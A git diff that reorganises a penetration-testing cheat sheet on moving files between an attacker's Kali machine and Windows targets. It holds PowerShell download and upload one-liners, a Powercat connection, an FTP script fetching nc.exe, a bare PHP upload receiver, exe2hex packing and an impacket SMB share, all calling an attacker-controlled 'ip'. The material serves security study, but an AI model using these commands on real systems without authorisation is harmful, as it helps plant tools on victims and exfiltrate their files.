@@ -94,33 +94,135 @@ Windows machine
 nc -nv ip 4444 > wget.exe
 ```
 
-## SMB Protocol
+## SCP Command
+
+[How to Use SCP Command to Securely Transfer Files](https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/)
+
+``` bash
+scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
+```
+
+To copy a file from a local to a remote system run the following command:
+
+``` bash
+scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt
+```
+
+To copy a directory from a local to remote system, use the -r option:
+
+``` bash
+scp -r /local/directory remote_username@10.10.0.2:/remote/directory
+```
+
+``` bash
+scp remote_username@10.10.0.2:/remote/file.txt /local/directory
+```
+
+## Upload files PHP Server
+
+Kali Machine
+
+``` php
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile= $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+Client
+
+PowerShell
+
+``` bash
+powershell.exe (New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
+```
+
+curl
+
+``` bash
+curl -F "file=@nc.cmd" http://ip/upload.php
+```
+
+## FTP Services
+
+### FTP Server
 
 Install
 
 ``` bash
-git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket
-sudo pip install -r requirements.txt
-sudo python3 setup.py install
+sudo apt-get install vsftpd
+sudo service vsftpd start
 ```
 
-SMB Server
+Anonymous access `/etc/vsftpd.conf`
+
+``` txt
+anonymous_enable=YES
+```
+
+### Pure-FTPd
+
+=== "Client"
+
+	ftp.txt
+
+	``` bash
+	open ip 21
+	USER hades
+	passwd
+	bin
+	GET nc.exe
+	quit
+	```
+
+	``` bash
+	ftp -v -n -s:ftp.txt
+	```
+
+=== "setup-ftp.sh"
+
+	``` bash
+	groupadd ftpgroup
+	useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+	pure-pw useradd hades -u ftpuser -d /ftphome
+	pure-pw mkdb
+	cd /etc/pure-ftpd/auth/
+	ln -s ../conf/PureDB 60pdb
+	mkdir -p /ftphome
+	chown -R ftpuser:ftpgroup /ftphome/
+	systemctl restart pure-ftpd
+	```
+
+### TFTP
+
+Server
 
 ``` bash
-$ locate whoami.exe
-/usr/share/windows-resources/binaries/whoami.exe
-
-$ smbserver.py a /usr/share/windows-binaries/
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
 ```
 
-SMB Client
+Checking running service
 
 ``` bash
-$ \\<ip_server>\a\whoami.exe
+$ getent services tftp
+tftp                  69/udp
 ```
 
-## PowerShell
+Client
+
+``` bash
+tftp -i ip put test.txt
+```
+
+## Windows
+
+### PowerShell
 
 Kali machine
 
@@ -155,7 +257,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip/wget.ex
 	echo $webclient.DownloadFile($url,$file) >> wget.ps1
 	```
 
-## Powercat
+### Powercat
 
 === "Bypass policy"
 
@@ -187,7 +289,7 @@ Windows machine
 powercat -c ip -p 443 -i C:\Users\Public\powercat.ps1
 ```
 
-## [VBScript](http://www.ericphelps.com/scripting/samples)
+### [VBScript](http://www.ericphelps.com/scripting/samples)
 
 === "command"
 
@@ -227,7 +329,7 @@ powercat -c ip -p 443 -i C:\Users\Public\powercat.ps1
 	echo ts.Close >> wget.vbs
 	```
 
-## Hex String
+### Hex String
 
 Smaller file
 
@@ -239,104 +341,30 @@ upx -9 nc.exe
 exe2hex -x nc.exe -p nc.cmd
 ```
 
-## FTP Server
+### SMB Protocol
 
 Install
 
 ``` bash
-sudo apt-get install vsftpd
-sudo service vsftpd start
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+sudo pip install -r requirements.txt
+sudo python3 setup.py install
 ```
 
-Anonymous access
+SMB Server
 
 ``` bash
-sudo nano /etc/vsftpd.conf
-
-=> anonymous_enable=YES
+$ locate whoami.exe
+/usr/share/windows-resources/binaries/whoami.exe
 ```
-
-## Pure-FTPd
-
-=== "Client"
-
-	ftp.txt
-
-	``` bash
-	open ip 21
-	USER hades
-	passwd
-	bin
-	GET nc.exe
-	quit
-	```
-
-	``` bash
-	ftp -v -n -s:ftp.txt
-	```
-
-=== "setup-ftp.sh"
-
-	``` bash
-	groupadd ftpgroup
-	useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-	pure-pw useradd hades -u ftpuser -d /ftphome
-	pure-pw mkdb
-	cd /etc/pure-ftpd/auth/
-	ln -s ../conf/PureDB 60pdb
-	mkdir -p /ftphome
-	chown -R ftpuser:ftpgroup /ftphome/
-	systemctl restart pure-ftpd
-	```
-
-## Upload files PHP Server
-
-Kali Machine
-
-``` php
-<?php
-$uploaddir = '/var/www/uploads/';
-
-$uploadfile= $uploaddir . $_FILES['file']['name'];
-
-move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
-?>
-```
-
-Client
-
-PowerShell
 
 ``` bash
-powershell.exe (New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
+smbserver.py a /usr/share/windows-binaries/
 ```
 
-curl
+SMB Client
 
 ``` bash
-curl -F "file=@nc.cmd" http://ip/upload.php
-```
-
-## Upload files with TFTP
-
-Server
-
-``` bash
-sudo apt update && sudo apt install atftp
-sudo mkdir /tftp
-sudo chown nobody: /tftp
-sudo atftpd --daemon --port 69 /tftp
-```
-
-Checking running service
-
-``` bash
-$ getent services tftp
-tftp                  69/udp
-```
-
-Client
-
-``` bash
-tftp -i ip put test.txt
+\\<ip_server>\a\whoami.exe
 ```
